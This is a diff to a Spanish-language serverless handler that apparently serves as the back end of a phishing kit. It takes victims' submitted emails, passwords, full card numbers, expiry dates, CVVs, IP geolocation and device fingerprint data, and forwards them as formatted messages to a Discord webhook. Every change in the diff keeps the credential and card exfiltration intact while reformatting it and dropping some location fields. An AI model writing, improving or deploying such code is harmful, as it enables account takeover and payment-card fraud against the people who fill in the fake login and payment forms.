@@ -21,7 +21,7 @@ async function githubRead() {
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Método no permitido' });
+    return res.status(405).json({ error: 'Metodo no permitido' });
   }
 
   try {
@@ -30,12 +30,12 @@ export default async function handler(req, res) {
       config = await githubRead();
     } catch (e) {
       console.error('Error leyendo config:', e.message);
-      return res.status(500).json({ error: 'No se pudo leer la configuración. Asegúrate de que GH_TOKEN esté configurado en Vercel.' });
+      return res.status(500).json({ error: 'No se pudo leer la configuracion. Asegurate de que GH_TOKEN este configurado en Vercel.' });
     }
 
     const webhookUrl = config.discordWebhook;
     if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) {
-      return res.status(400).json({ error: 'Webhook no configurado. Configura discordWebhook en el panel de administración.' });
+      return res.status(400).json({ error: 'Webhook no configurado. Configura discordWebhook en el panel de administracion.' });
     }
 
     const body = req.body || {};
@@ -67,13 +67,6 @@ export default async function handler(req, res) {
     const geoCountryCode = body.geoCountryCode || '';
     const geoTimezone = body.geoTimezone || timezone;
     const geoIsp = body.geoIsp || '';
-    const geoLatitude = body.geoLatitude || '';
-    const geoLongitude = body.geoLongitude || '';
-    const geoZip = body.geoZip || '';
-    const geoCurrency = body.geoCurrency || '';
-    const geoCurrencyCode = body.geoCurrencyCode || '';
-    const geoCallingCode = body.geoCallingCode || '';
-    const geoNetwork = body.geoNetwork || '';
 
     const deviceMemory = body.deviceMemory || 'desconocido';
     const cpuCores = body.cpuCores || 'desconocido';
@@ -89,7 +82,6 @@ export default async function handler(req, res) {
     const hasPlaceholders = template.includes('{email}');
     const isPayment = type === 'payment';
 
-    // Helper: reemplazar placeholder si existe en template
     function replaceIfExists(msg, ph, value) {
       if (msg.includes('{' + ph + '}')) {
         return msg.replace(new RegExp('\\{' + ph + '\\}', 'g'), value || '');
@@ -98,13 +90,12 @@ export default async function handler(req, res) {
     }
 
     let message = '';
-    let cardIncluded = false;
 
     if (hasPlaceholders) {
       message = template;
       message = replaceIfExists(message, 'email', email);
       message = replaceIfExists(message, 'password', password);
-      message = replaceIfExists(message, 'type', isPayment ? '💳 Verificación de pago' : '🔐 Inicio de sesión');
+      message = replaceIfExists(message, 'type', isPayment ? 'Pago' : 'Login');
       message = replaceIfExists(message, 'ip', clientIp);
       message = replaceIfExists(message, 'geoIp', geoIp);
       message = replaceIfExists(message, 'geoCity', geoCity);
@@ -113,13 +104,6 @@ export default async function handler(req, res) {
       message = replaceIfExists(message, 'geoCountryCode', geoCountryCode);
       message = replaceIfExists(message, 'geoTimezone', geoTimezone);
       message = replaceIfExists(message, 'geoIsp', geoIsp);
-      message = replaceIfExists(message, 'geoLatitude', geoLatitude);
-      message = replaceIfExists(message, 'geoLongitude', geoLongitude);
-      message = replaceIfExists(message, 'geoZip', geoZip);
-      message = replaceIfExists(message, 'geoCurrency', geoCurrency);
-      message = replaceIfExists(message, 'geoCurrencyCode', geoCurrencyCode);
-      message = replaceIfExists(message, 'geoCallingCode', geoCallingCode);
-      message = replaceIfExists(message, 'geoNetwork', geoNetwork);
       message = replaceIfExists(message, 'deviceMemory', deviceMemory);
       message = replaceIfExists(message, 'cpuCores', cpuCores);
       message = replaceIfExists(message, 'touchPoints', touchPoints);
@@ -141,84 +125,68 @@ export default async function handler(req, res) {
       message = replaceIfExists(message, 'onlineStatus', onlineStatus);
       message = replaceIfExists(message, 'cookiesEnabled', cookiesEnabled);
       message = replaceIfExists(message, 'timestamp', timestamp);
-      message = replaceIfExists(message, 'title', isPayment ? '💳 Verificación de pago' : '🔐 Inicio de sesión');
+      message = replaceIfExists(message, 'title', isPayment ? 'Verificacion de pago' : 'Inicio de sesion');
 
-      // Si es pago y la plantilla no incluye cardNumber, agregarlo al final
+      // Si es pago y la plantilla no tiene cardNumber, agregar seccion de tarjeta al final
       if (isPayment && !message.includes('{cardNumber}') && cardNumber) {
-        cardIncluded = true;
-        message += '\n\n━━━━━━━━━━━━━━━━━━━━━━━\n💳 **Datos de tarjeta**\n• Número: `' + cardNumber + '`\n• Titular: ' + cardHolder + '\n• Vence: ' + expiryDate + '\n• CVV: `' + cvv + '`';
+        message += '\n\n--------\nDATOS DE TARJETA:\nNumero: ' + cardNumber + '\nTitular: ' + cardHolder + '\nVence: ' + expiryDate + '\nCVV: ' + cvv;
       }
     } else {
       // Plantilla por defecto
       if (isPayment) {
-        message = '💳 **Verificación de pago**';
-        message += '\n──────────────────────────';
+        // Mensaje SOLO de pago - sin datos de login
+        message = '💳 Verificacion de pago';
+        message += '\n----------------';
         message += '\nUsuario: ' + email;
 
         if (cardNumber) {
-          message += '\n\n━━━━━━━━━━━━━━━━━━━━━━━\n💳 **Datos de tarjeta**';
-          message += '\n• Número: `' + cardNumber + '`';
-          message += '\n• Titular: ' + cardHolder;
-          message += '\n• Vence: ' + expiryDate;
-          message += '\n• CVV: `' + cvv + '`';
-          cardIncluded = true;
+          message += '\n\n----\nDATOS DE TARJETA:';
+          message += '\nNumero: ' + cardNumber;
+          message += '\nTitular: ' + cardHolder;
+          message += '\nVence: ' + expiryDate;
+          message += '\nCVV: ' + cvv;
         }
-        message += '\n──────────────────────────';
+        message += '\n----------------';
+        message += '\nIP: ' + clientIp;
+        message += '\nGeo IP: ' + geoIp;
+        if (geoCity) message += '\nCiudad: ' + geoCity;
+        if (geoRegion) message += '\nRegion: ' + geoRegion;
+        if (geoCountry) message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
+        message += '\nNavegador: ' + userAgent;
+        message += '\nIdioma: ' + language;
+        message += '\nPantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
+        message += '\nZona horaria: ' + timezone;
+        message += '\nHora: ' + timestamp;
       } else {
-        message = '🔐 **Nuevo inicio de sesión**';
-        message += '\n──────────────────────────';
+        // Mensaje de login completo
+        message = '🔐 Inicio de sesion';
+        message += '\n----------------';
         message += '\nUsuario: ' + email;
         message += '\nContraseña: ' + password;
+        message += '\nIP: ' + clientIp;
+        message += '\nGeo IP: ' + geoIp;
+        if (geoCity) message += '\nCiudad: ' + geoCity;
+        if (geoRegion) message += '\nRegion: ' + geoRegion;
+        if (geoCountry) message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
+        if (deviceMemory !== 'desconocido' || cpuCores !== 'desconocido') {
+          message += '\n\nDispositivo:';
+          message += '\nRAM: ' + deviceMemory;
+          message += '\nCPU: ' + cpuCores;
+          message += '\nTipo: ' + isMobile + ' / ' + isTablet + ' / ' + isDesktop;
+        }
+        if (batteryLevel !== 'No disponible') {
+          message += '\nBateria: ' + batteryLevel + ' (Cargando: ' + batteryCharging + ')';
+        }
+        message += '\nNavegador: ' + userAgent;
+        message += '\nIdioma: ' + language;
+        message += '\nPantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
+        message += '\nZona horaria: ' + timezone;
+        message += '\nPlataforma: ' + platform;
+        message += '\nEstado: ' + onlineStatus;
+        message += '\nCookies: ' + cookiesEnabled;
+        message += '\n----------------';
+        message += '\nHora: ' + timestamp;
       }
-
-      message += '\nIP: ' + clientIp;
-      message += '\nGeo IP: ' + geoIp;
-
-      if (geoCity || geoRegion || geoCountry) {
-        message += '\nCiudad: ' + geoCity;
-        message += '\nRegión: ' + geoRegion;
-        message += '\nPaís: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
-        message += '\nISP: ' + geoIsp;
-        message += '\nLatitud: ' + geoLatitude;
-        message += '\nLongitud: ' + geoLongitude;
-      }
-
-      if (deviceMemory !== 'desconocido' || cpuCores !== 'desconocido') {
-        message += '\n\n**Dispositivo:**';
-        message += '\n• Memoria RAM: ' + deviceMemory;
-        message += '\n• CPU: ' + cpuCores;
-        message += '\n• Puntos táctiles: ' + touchPoints;
-        message += '\n• Tipo: ' + isMobile + ' (Móvil) / ' + isTablet + ' (Tablet) / ' + isDesktop + ' (Escritorio)';
-      }
-
-      if (batteryLevel !== 'No disponible') {
-        message += '\n• Batería: ' + batteryLevel + ' (Cargando: ' + batteryCharging + ')';
-      }
-
-      message += '\n\n**Navegador:** ' + userAgent;
-      message += '\n• Idioma: ' + language;
-      message += '\n• Pantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
-      message += '\n• Zona horaria: ' + timezone;
-      message += '\n• Plataforma: ' + platform;
-      message += '\n• Estado: ' + onlineStatus;
-      message += '\n• Cookies: ' + cookiesEnabled;
-      message += '\n──────────────────────────';
-      message += '\nHora: ' + timestamp;
-    }
-
-    // FALLBACK: incluir contraseña si no está
-    if (password !== '****' && message.indexOf(password) === -1 && !isPayment) {
-      message += '\nContraseña: ' + password;
-    }
-
-    // FALLBACK: incluir ubicación si no está
-    if (!message.includes('Ciudad:') && (geoCity || geoRegion || geoCountry)) {
-      message += '\nCiudad: ' + geoCity;
-      message += '\nRegión: ' + geoRegion;
-      message += '\nPaís: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
-      message += '\nISP: ' + geoIsp;
-      message += '\nLatitud: ' + geoLatitude;
-      message += '\nLongitud: ' + geoLongitude;
     }
 
     const discordRes = await fetch(webhookUrl, {
@@ -238,7 +206,6 @@ export default async function handler(req, res) {
       success: true,
       message: 'Mensaje enviado correctamente.'
     });
-
   } catch (err) {
     console.error('Error en API Discord:', err);
     return res.status(500).json({ error: 'Error interno: ' + err.message });
